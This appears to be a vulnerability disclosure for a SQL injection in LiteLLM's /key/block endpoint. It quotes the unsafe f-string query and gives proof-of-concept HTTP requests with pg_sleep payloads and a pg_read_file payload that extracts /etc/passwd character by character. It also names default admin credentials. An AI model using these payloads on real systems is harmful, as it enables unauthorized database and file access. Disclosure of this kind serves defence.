# Description
There is sql injection in this endpoint `/key/block`.
This code exhibits a vulnerability. If `token` variable contain malicious data, it can lead to a SQL Injection, which could further enable a Local File Read.
```
sql_query = f"""
SELECT 
v.*,
t.spend AS team_spend, 
t.max_budget AS team_max_budget, 
t.tpm_limit AS team_tpm_limit,
t.rpm_limit AS team_rpm_limit,
t.models AS team_models,
t.metadata AS team_metadata,
t.blocked AS team_blocked,
t.team_alias AS team_alias,
t.metadata AS team_metadata,
t.members_with_roles AS team_members_with_roles,
tm.spend AS team_member_spend,
m.aliases as team_model_aliases
FROM "LiteLLM_VerificationToken" AS v
LEFT JOIN "LiteLLM_TeamTable" AS t ON v.team_id = t.team_id
LEFT JOIN "LiteLLM_TeamMembership" AS tm ON v.team_id = tm.team_id AND tm.user_id = v.user_id
LEFT JOIN "LiteLLM_ModelTable" m ON t.model_id = m.id
WHERE v.token = '{token}'
"""
```

 # Proof of Concept
1. Login into admin panel with username `admin` and password `sk-1234`.
2. Send the following POC to the `/key/block`. You can see that it sleeps for 5 seconds. This demonstrates the existence of a time-based SQL injection here.
```
POST /key/block HTTP/1.1
Host: 127.0.0.1:4000
Content-Length: 115
Authorization: Bearer sk--OfzCyUwBZt3rpcddaguWw
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Content-Type: application/json
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{
  "key": "1'||pg_sleep(5); -- -"
}
```
3. Modify the POC, using the `pg_read_file()` function and time delay to read the contents of the `/etc/passwd` file. The response will only be delayed when the character matches.
```
POST /key/block HTTP/1.1
Host: 127.0.0.1:4000
Content-Length: 115
Authorization: Bearer sk--OfzCyUwBZt3rpcddaguWw
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Content-Type: application/json
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{
  "key": "1'|| CASE WHEN pg_read_file('/etc/passwd', 0, 1) = 'r' THEN pg_sleep(10) ELSE pg_sleep(0) END; -- -"
}                
```
Send the request packet to Burp Intruder, modify the offset of the `pg_read_file()` function, then iterate through all characters for matching. Identify the character that causes a delayed response. The following image proves that the first two characters of `/etc/passwd` are 'r' and 'o'. By using this method, you can obtain the entire content of the file.

![551729649470_ pic](https://github.com/user-attachments/assets/98c0bb9f-03a8-43ec-b980-87d114e87362)
![541729649429_ pic](https://github.com/user-attachments/assets/e2f8d555-a4e9-4a0a-b655-01d8fd6d8f10)




